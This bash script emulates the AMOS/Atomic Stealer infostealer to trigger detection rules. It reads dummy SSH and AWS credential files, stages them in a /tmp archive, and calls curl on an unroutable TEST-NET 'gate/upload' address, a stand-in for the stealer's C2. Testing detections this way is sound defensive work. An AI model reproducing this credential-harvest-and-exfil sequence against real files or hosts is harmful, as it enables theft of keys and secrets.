#!/usr/bin/env bash
# amos.sh — benign emulation of AMOS / "Atomic Stealer" for detection-rule testing.
#
# What AMOS does on a victim: harvest browser credentials, crypto wallets and keychain/SSH keys,
# stage them into an archive, and curl the archive to a C2. This does the harmless analogue: it
# creates DUMMY credentials in its own scratch dir, reads them (the TTP the rule catches), stages a
# fake "loot" archive, and "exfils" to an unroutable TEST-NET address that nothing can reach. No
# real secret is touched, nothing leaves the host, everything is cleaned up. See ./README.md.
#
# Imitates: AMOS / Atomic Stealer (credential + wallet theft, stage, C2 POST)
# Expected rules: credential_file_read, download_ip_to_tmp
set -u
work=$(mktemp -d) || exit 0
trap 'rm -rf "$work" /tmp/amos-loot.tgz /tmp/amos-resp 2>/dev/null' EXIT

# --- fake victim data, so no real file is ever read ---
mkdir -p "$work/.ssh" "$work/.aws"
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nDUMMYKEYNOTREAL\n-----END OPENSSH PRIVATE KEY-----\n' > "$work/.ssh/id_rsa"
printf '[default]\naws_access_key_id=AKIADUMMYDUMMY\naws_secret_access_key=dummynotreal\n' > "$work/.aws/credentials"

# --- TTP: read credentials directly (AMOS harvests keys/tokens) -> credential_file_read ---
cat "$work/.ssh/id_rsa" >/dev/null 2>&1
base64 "$work/.aws/credentials" >/dev/null 2>&1

# --- TTP: stage loot and "exfil" to a C2 (AMOS curls the archive out) -> download_ip_to_tmp ---
# 192.0.2.1 is TEST-NET-1 (RFC 5737): guaranteed unroutable, so nothing leaves; the egress wall
# would block it regardless. The point is the curl-an-IP-into-/tmp audit event.
tar czf /tmp/amos-loot.tgz -C "$work" . >/dev/null 2>&1
curl -s --max-time 2 "http://192.0.2.1/gate/upload" -o /tmp/amos-resp >/dev/null 2>&1 || true

exit 0
